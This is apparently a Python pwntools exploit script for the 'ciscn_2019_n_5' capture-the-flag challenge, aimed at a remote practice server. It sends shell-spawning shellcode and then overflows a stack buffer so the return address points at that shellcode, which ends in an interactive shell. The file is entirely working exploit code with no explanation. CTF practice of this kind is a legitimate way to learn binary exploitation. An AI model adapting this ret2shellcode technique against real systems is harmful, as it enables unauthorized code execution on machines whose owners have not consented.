from pwn import *
context(log_level = 'debug', arch = 'amd64', os = 'linux')
shellcode=asm(shellcraft.sh())

#conn = process('./ciscn_2019_n_5')
conn = remote('node4.buuoj.cn',27052)
#gdb.attach(conn, 'b start')
conn.recvuntil(b'tell me your name\n')

conn.sendline(shellcode)
conn.recvuntil(b'to me?\n')
payload = b'a' * (0x20 + 0x8) + p64(0x601080)
conn.sendline(payload)
#conn.recv()
conn.interactive()
